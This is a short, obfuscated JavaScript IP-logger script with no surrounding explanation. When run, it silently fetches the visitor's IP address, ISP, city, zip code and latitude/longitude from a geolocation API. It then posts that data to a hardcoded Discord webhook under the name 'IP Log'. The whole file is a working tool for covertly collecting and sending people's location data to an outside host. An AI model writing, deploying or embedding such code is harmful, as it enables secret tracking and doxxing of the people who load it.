var _0x1a2b = "https://discord.com/api/webhooks/1342252232871116912/GvJgqEVYESdaJq55mXZE8P0Ysy7BR-bNBBtigKg6fp0XO4lAO7DF6ZlTyCG_pqveZSni";
const _0x3a4b = async () => {
    const _0x5c6d = await fetch('https://ip-api.com/json/');
    const _0x7e8f = await _0x5c6d.json();

    var _0x9a0b = _0x7e8f.query;
    var _0x1c2d = _0x7e8f.org + " (" + _0x7e8f.as + ")";
    var _0x3e4f = _0x7e8f.timezone;
    var _0x5a6b = _0x7e8f.country;
    var _0x7c8d = _0x7e8f.countryCode.toLowerCase();
    var _0x9e0f = _0x7e8f.region + " (" + _0x7e8f.regionName + ")";
    var _0xa10b = _0x7e8f.city;
    var _0xc12d = _0x7e8f.zip;
    var _0xe14f = _0x7e8f.lat;
    var _0x1011 = _0x7e8f.lon;

    var _0x1213 = new XMLHttpRequest();
    _0x1213.open("POST", _0x1a2b);
    _0x1213.setRequestHeader('Content-type', 'application/json');

    var _0x1415 = {
        username: "IP Log",
        avatar_url: "",
        content: "__**:globe_with_meridians: IP-Adress:**__ \n" +
            "`" + _0x9a0b + "`" +
            "\n \n__**:telephone: Provider:**__ \n" +
            _0x1c2d +
            "\n \n__**:map: Timezone:**__ \n" +
            _0x3e4f +
            "\n \n__**:flag_" + _0x7c8d + ": Country and Region:**__ \n" +
            _0x5a6b + " - " + _0x9e0f +
            "\n \n__**:cityscape: Zip Code & City:**__ \n" +
            _0xc12d + " " + _0xa10b +
            "\n \n__**:round_pushpin: Location:**__ \n" +
            "**Longitude:** " + _0x1011 + "\n" +
            "**Latitude:** " + _0xe14f
    };

    _0x1213.send(JSON.stringify(_0x1415));
};

_0x3a4b();